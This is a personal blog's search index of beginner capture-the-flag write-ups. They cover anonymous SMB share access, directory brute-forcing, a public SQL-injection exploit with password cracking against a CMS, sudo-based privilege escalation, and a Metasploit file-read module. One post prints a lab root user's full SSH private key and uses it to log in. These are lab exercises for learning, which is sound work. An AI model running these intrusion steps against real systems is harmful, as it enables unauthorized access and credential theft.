[{"content":"###Introduction The CTI intercepted the attached file. Analyze it and respond to the questions.\nDownload the attached file and make sense out of it.\n","date":"2024-03-19T00:00:00Z","permalink":"https://ravistanley.github.io/p/wifi-hacking-101/","title":"Strings Strings Strings"},{"content":"Introduction Hello, fellow cybersecurity enthusiasts! Welcome to my CTF Journey, where I, will be sharing my experiences, challenges, and triumphs as I embark on a thrilling adventure into the world of Capture The Flag (CTF) competitions. This blog will primarily revolve around CTFs, as I dive headfirst into this captivating realm of cybersecurity.\nAbout Me Let me start by introducing myself. I am a passionate individual with an insatiable curiosity for all things cybersecurity. While I am relatively new to CTFs and the broader field of cybersecurity, I am eager to learn and grow. I believe that by documenting my journey through this blog, I can not only track my progress but also provide valuable insights to fellow newcomers and maybe even inspire others to join me on this exciting path.\nBlog Focus This blog will primarily focus on CTFs, which are simulated cybersecurity challenges designed to test one\u0026rsquo;s hacking skills, problem-solving abilities, and creativity. As I navigate through various CTF competitions, I will share my experiences, strategies, and lessons learned along the way. Expect to find walkthroughs, tips, and tricks, as well as reflections on my successes and failures.\nAcknowledging My Imperfections It\u0026rsquo;s important to note that I am by no means an expert in the field of cybersecurity or CTFs. As a beginner, I expect to encounter obstacles and make mistakes. However, I am determined to give my best, constantly improve my skills, and share my progress with you. This blog will serve as a platform for me to document my journey, showcase my achievements, and also highlight the areas where I can grow.\nJoin Me on the Adventure Whether you\u0026rsquo;re a seasoned cybersecurity professional, a fellow newbie, or someone simply curious about CTFs, I invite you to join me on this thrilling adventure. Let\u0026rsquo;s explore the fascinating world of CTFs together, share knowledge, and foster a vibrant community of learners. Through this blog, we can support one another, exchange ideas, and collectively enhance our cybersecurity prowess.\nConclusion Welcome to dr0idbot\u0026rsquo;s cybersecurity journey! Together, let\u0026rsquo;s embark on an exhilarating exploration of CTFs, where we\u0026rsquo;ll tackle challenges, unravel mysteries, and celebrate every step of progress. While I may be new to this realm, my dedication and enthusiasm will drive me forward, and I hope you\u0026rsquo;ll find inspiration in my story. Stay tuned for upcoming posts filled with valuable insights, thrilling adventures, and perhaps a few surprises along the way. Let the journey begin!\nDisclaimer: The content presented in my articles is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\n","date":"2023-06-03T00:00:00Z","image":"https://ravistanley.github.io/p/welcome-blog/cover_hu4412722634835062429.jpg","permalink":"https://ravistanley.github.io/p/welcome-blog/","title":"Welcome Blog"},{"content":"Introduction This challenge is about the basics of SMB and how misconfigurations can lead to compromise of the system SMB is running on. SMB is an acronym for Server Message Block, a protocol used in networks for file sharing that is implemented on Microsoft Windows operating systems. A quick Google search can reveal the same: Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nNote If you\u0026rsquo;re following through practically, make sure you use the target\u0026rsquo;s machine\u0026rsquo;s IP provided once you click the start machine icon on the challenge webpage.\nEnumeration. Once you spawn the target, you are given a vulnerable target\u0026rsquo;s IP (in my case: 10.129.84.148 ) which we will enumerate by use of NMAP by running the command:\n1 nmap 10.129.84.148 which should scan and give us a report on open ports running on the target as shown below: We see that the target has three open ports and one specifically running Microsoft-ds on port 445.\nObservations \u0026amp; Findings Now that we know the service running on this port, we can try and list the shares available on the target by running the command:\n1 smbclient -N -L \\\\\\\\10.129.84.148 The -N option suppresses the password prompt that is needed to connect to this service, -L on the other hand lists the shares available on the target. Here are the results from our target.\nWe already know the shares available on the target, so I can now try to connect to each of the available shares, but I don\u0026rsquo;t have a password, so I am going to try to log in to each of them without giving a password.\nFoothold Things don\u0026rsquo;t seem to go as planned, except for just one share that lets me in without a password, the WorkShares share. Here is the command I ran to be able to connect to it:\n1 smbclient \\\\\\\\10.129.84.148\\\\WorkShares When prompted for a password, press enter. Now we list the directories available using ls and see a couple of interesting stuff here, in essence, there are two users listed:\nAmy.J James.P I check the first user\u0026rsquo;s folder, but there is no sign of the flag. Next, I try to navigate to the second user\u0026rsquo;s folder.\nSolution/Flag I do this by running the following command:\n1 cd James.P Then I list the contents of his directory where we see a file called flag.txt which we then download to our attack machine using:\n1 get flag.txt Then leave this service by running the exit command.\nNow since we are back on our attack machine we can navigate to the directory where the flag file is saved and view its contents. We have our flag for this challenge. That also leaves us with all the answers to the questions that came with this challenge.\nConclusion In summary, the SMB protocol is very useful in sharing resources between hosts. However, a big security risk is onboarded if this protocol is misconfigured. This room has shown me how easy it can be to gain access to shares within an SMB if there are few to no strict security measures associated with it.\ndr0idbot signing off.\n","date":"2024-02-25T00:00:00Z","image":"https://ravistanley.github.io/p/dancing/Completed_hu17933129339373751557.png","permalink":"https://ravistanley.github.io/p/dancing/","title":"DANCING"},{"content":"Introduction Hello guys, it has been quite some time since I made a CTF writeup and I figured it\u0026rsquo;s time to share some of my notes with you. Like many of you, I am a beginner and I am still learning and exploring stuff in cyber security. Just recently I got interviewed by CyberShujaa as I had applied to be a scholar in their program for the Security Analyst path. I am happy to say that I have been shortlisted for the program. As part of the admission process, I was required to try out this beginner-level CTF challenge and I thought it wise to take some notes while solving it. You can find the challenge here.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nSimpleCTF Challenge. After clicking the start machine icon on the challenge webpage, you are presented with an IP of the vulnerable target, the first thing I normally do is to ping the target just to see if it is alive. Since we have replies from the target we will now proceed to the next step of exploration.\nObservations \u0026amp; Findings We begin by scanning the target using the tool Nmap to find open ports running on it and also identify the services running on those ports. to do that, we use the command:\n1 nmap -sV 10.10.64.42 Note If you\u0026rsquo;re following through the tutorial, make sure you use the target\u0026rsquo;s machine\u0026rsquo;s IP provided once you click the start machine icon on the challenge webpage. Here are the results from our scan.\nNotice that we have three open ports.\nPort 22 running ftp Port 80 running HTTP Port 2222 running SSH Now we try accessing the webpage running on port 80 by pasting the IP and port number (80) for the service on the browser and we are welcomed with this page: There is not much going on here so I decided to brute force the target\u0026rsquo;s website to see if I can find other web pages that might be helpful in this quest. For this, I use Gobuster using this command:\n1 gobuster dir -u http://10.10.64.42:80 -w /usr/share/wordlists/directory-list-2.3-small.txt Here are the results from the brute force attack: We discover a directory /simple that we now visit on the browser and find this: When we scroll down to the footer of the webpage, we find something interesting: What comes to sight is the version number of the tool that was used to build this website. So I run a quick Google search about its vulnerabilities and possible exploits. It is discovered that CMS Made simple version 2.2.10 and below are vulnerable to SQL Injection. I found a good Python script that can be used to exploit this vulnerability here.\nI download the script and try to run it to see its usage: .\nAfter seeing its usage, we can now decide the syntax to use for the exploit to work on the target depending on our needs. so we use the command:\n1 python3 cmsexploit.py -u http://10.10.64.42:80 --crack -w /usr/share/wordlists/rockyou.txt After running for a while we get the following output as shown below, and it contains:\nThe salt for the password some identified user The user\u0026rsquo;s username Their email address Hashed password The cracked password Now that we have some credentials let\u0026rsquo;s try them out on another service that we found running on the target SSH. The command for logging in on ssh using the username and password that we found is:\n1 ssh mitch@10.10.64.42 -p2222 Then type yes and accept to proceed and provide the acquired password. A successful login should land you at a terminal like this:\nSolution/Flag Now that we are logged in as Mitch I try to list the contents of his home directory and voila, we capture our first flag which is in the user.txt file.\nI then try to go back to see if there is any other user on this machine and if I have access to their directory. I found another user sunbath but have no access to his directory. I moved back to another directory and tried to gain access to the root\u0026rsquo;s directory but again, I hit a wall. I run the command:\n1 sudo -l to see what permissions Mitch has or what he can run as root without having to provide a password. The results: We gain access to the root shell after finding out that he can access vim as root. To find the custom command to cater to your needs use this website. Now that we\u0026rsquo;re root, let\u0026rsquo;s confirm that and see if we have access to the root\u0026rsquo;s directory.\nConclusion In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging the use of tools and exploits, directory permissions, and sudo privileges, we elevate our access and seize the flags.\nRemember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.\ndr0idbot signing off.\n","date":"2023-12-31T00:00:00Z","image":"https://ravistanley.github.io/p/simplectf/Banner_hu18267649900384956567.png","permalink":"https://ravistanley.github.io/p/simplectf/","title":"SimpleCTF"},{"content":"This image is courtesy of CyberHoot\nIntroduction After breaching a target\u0026rsquo;s defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nPrivilege Escalation Challenge. Welcome back to another HackTheBox challenge, an easy Capture The Flag (CTF) exercise. The past few blogs have been covering the module Getting Started. The instructions provided are as follows: SSH (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.\nObservations \u0026amp; Findings We begin by using the provided credentials to establish an SSH connection to the target machine: If you\u0026rsquo;re following through Note that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.\nOur first command:\n1 2 ┌──(papab3ar㉿kali)-[~] └─$ ssh user1@94.237.49.11 -p 31973 Upon connection, a message about host authenticity appears. Confirm by typing \u0026ldquo;yes\u0026rdquo; and entering the provided password. A successful login grants terminal access:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ Attempting to list directories reveals limited information. Exploring further, we discover another user, user2:\n1 2 3 user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../ user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls user1 user2 Navigation to user2\u0026rsquo;s directory uncovers the flag.txt file, but access is denied:\n1 cat: flag.txt: Permission denied What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:\n1 sudo -l The output:\n1 2 3 4 5 6 7 8 Matching Defaults entries for user1 on ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user1 may run the following commands on ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: (user2 : user2) NOPASSWD: /bin/bash Something interesting shows up here about our users. First, we see the text NOPASSWD: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.\nThen we note the /bin/bash: This is the path to the \u0026ldquo;bash\u0026rdquo; shell executable. Allowing user1 to run \u0026ldquo;/bin/bash\u0026rdquo; means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.\nWith this in mind, I now want to see if it will work. So I run the following command for user2 as user1:\n1 sudo -u user2 /bin/bash From the terminal, this seems to have worked since the CLI switched from:\n1 user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: to this:\n1 user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ Notice that we now have user2 access. So, once again, we try to read the flag.txt file and manage to get the flag.\n1 2 3 4 user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls flag.txt user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt HTB{l473r4l_********_**_*******_u53r} Ah great, so what, are we done? Or is there more we could do here? We have further instructions: Now we try to see if we can be the root user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:\n1 2 3 cd ../../ ls cd root Then I list all directories and this is the output I get:\n1 2 user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a . .. .bash_history .bashrc .profile .ssh .viminfo flag.txt As you can see here, we have our flag.txt file. I\u0026rsquo;m tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,.ssh. So I navigate to it and list its contents.\nThe .ssh folder in a user\u0026rsquo;s home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication.\nauthorized_keys: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client\u0026rsquo;s public key matches any of the keys listed in this file. If there\u0026rsquo;s a match, the client is granted access without needing to enter a password.\nid_rsa: A private key file for the user\u0026rsquo;s SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.\nid_rsa.pub: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user\u0026rsquo;s identity during the SSH authentication process.\nNow it is time to see if we have access to the id_rsa file. If we do, we can use the root user\u0026rsquo;s private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 cat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Solution/Flag I copy the key to my local machine in a file named id_rsa and save it, then try to use it to log in as the root user using the commands:\n1 2 ──(papab3ar㉿kali)-[~] └─$ ssh root@94.237.49.11 -p 31973 -i id_rsa Let me break this command down in bits: ssh: This is the command used to start an SSH connection.\nroot@94.237.49.11: This specifies the username and IP address of the remote server. In this case, the username is \u0026ldquo;root,\u0026rdquo; and the IP address is \u0026ldquo;94.237.49.11.\u0026rdquo;\n-p 31973: This option specifies the port number to use for the SSH connection. The port number is set to \u0026ldquo;31973.\u0026rdquo;\n-i id_rsa: This option specifies the identity (private key) file to use for authentication. In this case, the private key file named \u0026ldquo;id_rsa\u0026rdquo; is being used for authentication. of-course we gain access to the machine as the root user as we get the welcome banner like we got during our initial access with the root user\u0026rsquo;s shell:\n1 root@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~# So now we just list directories and read the contents of the flag.txt file.\n1 2 3 ls cat flag.txt HTB{pr1v1l363_**********_2_r007} Conclusion In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.\nRemember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.\ndr0idbot signing off.\n","date":"2023-08-11T00:00:00Z","image":"https://ravistanley.github.io/p/privilege-escalation/PriviledgeEscalation_hu9417069201968233595.jpg","permalink":"https://ravistanley.github.io/p/privilege-escalation/","title":"Privilege Escalation"},{"content":"Introduction Welcome to yet another writeup where I cover an important tool used by hackers to exploit vulnerabilities on different systems: Metasploit In this challenge, part of the \u0026ldquo;Getting started\u0026rdquo; series on HackTheBox Academy, we will be delving into the realm of public exploits and uncovering the power of Metasploit.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nPublic exploits Challenge. The challenge instructions were simple: \u0026ldquo;Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the \u0026lsquo;/flag.txt\u0026rsquo; file.\u0026rdquo; The main focus of this challenge is to demonstrate the ability to identify vulnerabilities and effectively exploit them. Let\u0026rsquo;s begin our journey by examining the target IP address and visiting the associated webpage. Observations \u0026amp; Findings Upon accessing the webpage, the very first thing that caught our attention was a version number and a brief description of a WordPress service. Drawing from our knowledge of how to find and exploit publicly available vulnerabilities, we swiftly launched the Metasploit console to search for an exploit relevant to this specific version. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ──(dr0idbot㉿kali)-[~] └─$msfconsole - - - - - SNIP - - - - - msf6 \u0026gt; search exploit wordpress 2.7.10 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/wp_simple_backup_file_read normal No WordPress Simple Backup File Read Vulnerability Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read msf6 \u0026gt; Metasploit came back with results, indicating that there is a publicly available exploit matching the version we found on the website.\nNotice the command used to spin up metasploit msfconsole after its up and running, we run the command search exploit wordpress 2.7.10 to see if there are any publicly available exploits for this plugin version. Sure enough, metasploit brings back results and slight description of what we are looking for matching the info on the website we had visited earlier on.\nWe have an option to see information about that exploit before using it, to see what they payload does. For that we use the command info plus the index of the exploit itself.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 msf6 \u0026gt; info 0 Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DEPTH 6 yes Traversal Depth (to reach the root fold er) FILEPATH /etc/passwd yes The path to the file to read Proxies no A proxy chain of format type:host:port[ ,type:host:port][...] RHOSTS yes The target host(s), see https://docs.me tasploit.com/docs/using-metasploit/basi cs/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connecti ons TARGETURI / yes The base path to the wordpress applicat ion THREADS 1 yes The number of concurrent threads (max o ne per host) VHOST no HTTP server virtual host Description: This module exploits a directory traversal vulnerability in WordPress Plugin \u0026#34;Simple Backup\u0026#34; version 2.7.10, allowing to read arbitrary files with the web server privileges. - - - - - SNIP - - - - - As you can see, a bunch of information is given about this particular exploit with a number options that we need to set in order for the payload to work on our target. Next we use the command use plus the index of the exploit we have picked for the exploitation. After selection we set the options that are required by metasploit before executing the payload.\n1 2 3 4 msf6 \u0026gt; use 0 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set FILEPATH /flag.txt msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set RHOSTS 94.237.49.11 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set RPORT 41884 After obtaining information about the exploit, including the required options, we set the necessary values to ensure the payload will work against our target. With all the options set, we verified the details and executed the payload on the target.\nSolution/Flag Upon successful execution of the payload, the Metasploit console provided us with the following output:\n1 2 3 [+] File saved in: /home/papab3ar/.msf4/loot/20230803014901_default_94.237.49.11_simplebackup.tra_422018.txt [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Using the command cat, we accessed the directory where the file was saved and retrieved the contents of the flag, thus completing the challenge. Conclusion Metasploit proved to be a powerful tool during this challenge, allowing us to search for and exploit publicly available vulnerabilities effortlessly. It demonstrates the significance of staying vigilant against potential threats and the importance of secure coding practices for developers.\nFor a deeper understanding of Metasploit and its capabilities, you can refer to its official documentation here\nIn conclusion, this challenge provided an excellent opportunity to apply web enumeration techniques, uncover hidden information, and identify potential vulnerabilities. As ethical hackers, the quest for knowledge and continuous learning is paramount. Happy hacking, and never stop learning!\ndr0idbot out.\n","date":"2023-08-02T00:00:00Z","image":"https://ravistanley.github.io/p/public-exploits/Metasploit_hu7852784636224514048.png","permalink":"https://ravistanley.github.io/p/public-exploits/","title":"Public Exploits"},{"content":"Introduction Hello friend :) I know it has been a while but, welcome to another writeup from a challenge discovered at one of the best learning platforms for hackers HackTheBox. This challenge is part of the Getting Started module and can be found here. It is an excellent starting point for those interested in offensive security or red teaming.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nWeb Enumeration Challenge. The challenge instructions were straightforward: \u0026ldquo;Try running some of the web enumeration techniques you learned in this section on the server above, and use the info you get to get the flag.\u0026rdquo; The focus of the challenge was to apply web enumeration techniques to assess the security of websites. By copying the target IP address and visiting the associated webpage, We are greeted with some welcome text to the \u0026ldquo;HTB blog page\u0026rdquo;. Observations \u0026amp; Findings Upon first inspection, there wasn\u0026rsquo;t much information visible on the webpage. My next step was to inspect the page\u0026rsquo;s underlying code, which is often a good starting point for such challenges. Unfortunately, even after inspecting the code, I didn\u0026rsquo;t find anything substantial. So, I decided to leverage the tool gobuster to perform a brute-force attack on the website and find other directories.\nThis approach paid off as I discovered a directory. Navigating this directory revealed a page that appeared to be under construction, possibly an incomplete WordPress site. Once again, I decided to inspect the page\u0026rsquo;s code, hoping to find something useful. This time, I stumbled upon a section related to web crawlers. Web crawlers, also known as spiders or spiderbots, systematically browse the World Wide Web on behalf of search engines for indexing purposes. Websites often use a file called robots.txt to instruct or block these crawlers from accessing certain web directories. Armed with this knowledge, I attempted to access the robots.txt file to view its contents. Once again, I inspected the code of this page and came across some interesting comments. It seemed that the web developer forgot to remove the comments containing login credentials for the admin user. Page code inspection follows: Solution/Flag Using the credentials found in the comments, I successfully logged in as an admin user, which led me to a new page containing the flag for the challenge.\nConclusion In conclusion, this challenge provided a great opportunity to apply web enumeration techniques to uncover hidden information and identify potential vulnerabilities. The process involved inspecting the underlying code, using gobuster for directory enumeration, understanding the significance of robots.txt files, and recognizing the importance of secure coding practices.\nAs a hacker, it\u0026rsquo;s crucial to continuously explore and learn new techniques. Happy hacking, and never stop learning!\ndr0idbot out.\n","date":"2023-07-29T00:00:00Z","image":"https://ravistanley.github.io/p/web-enumeration/Web_hu16815479322497795254.jpg","permalink":"https://ravistanley.github.io/p/web-enumeration/","title":"Web Enumeration"},{"content":"Introduction Welcome to another exciting journey into the world of Cybersec and its mysteries! In this blog post, we\u0026rsquo;ll explore a captivating gamified challenge in the field of Digital Forensics. Join me as we dive into the intriguing world of Capture The Flag and unravel the secrets behind the challenge titled \u0026lsquo;Keep it Simple.\u0026rsquo; This challenge is part of the Introduction to Cybersecurity (Online) series that I have been looking into over the past few days and can be found here.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nUnveiling the Enigma: Keep it Simple Challenge. The challenge description had the string: The answer is simple(as you will see, it truly is simple). The more one can gather from here is that it\u0026rsquo;s a Digital Forensics challenge titled: Keep it simple Upon clicking the green \u0026ldquo;Start Challenge\u0026rdquo; button, I was presented with a link to a webpage that looks like this:\nObservations \u0026amp; Findings As usual, the first thing I always try to do with these challenges, is to inspect the page where its hosted for hints or clues on how to proceed with an attempt. The trick is to be as keen as you can when doing this so as not to miss on any breadcrumbs :D. At first glance, the webpage source code looks normal but on taking a closer look you notice a reference to two images with only one being embedded on the webpage. My curiosity kicked in:\nSo I downloaded both the images, to get a closer look and see if there is something out of the ordinary about them. The first image that was embedded on the webpage I saved as is, that is the_eye.jpeg and image two (hidden hint in source code) saved as the_eye0.jpeg. Again at first glance, everything about this images looks the same, from file size, dimensions of the image and most obviously their outlook. So we have to use the eye of a thief, to see what others dont. Here is a glimpse of both the images:\nNext, I decide to compare the images using diff command from the terminal to compare if the images are actually the same or not. Here is the output from the comparison:\nWe are seeing here that the two files actually differ, which makes me more curious and I therefore decide to look at the images metadata using the exiftool and here out attention is drawn to the difference of the two images that we normally wouldnt have seen from just looking at the pictures.\nI try as much as I can to link additional information on new terms and tools used in the blog check them out to learn more.\nSolution/Flag To look at the metadata of both the images we type the command exiftool followed by the filename. See the image below for output comparison.\n.\nKudos!! We now captured the flag.I have obfuscated the flag to keep the integrity of the challenge.\nConclusion In conclusion, this challenge reminds us that sometimes the answers are simple and can be found in plain sight. By honing our observation skills and utilizing powerful tools like diff and exiftool, we can uncover hidden secrets. Remember, even in the world of cybersecurity, simplicity can hold the key to success. Keep exploring, keep hacking, and never stop learning! Happy Hacking. dr0idbot out.\n","date":"2023-06-21T00:00:00Z","image":"https://ravistanley.github.io/p/keep-it-simple/The%20eye_hu16344451759511053598.jpg","permalink":"https://ravistanley.github.io/p/keep-it-simple/","title":"Keep it Simple"}]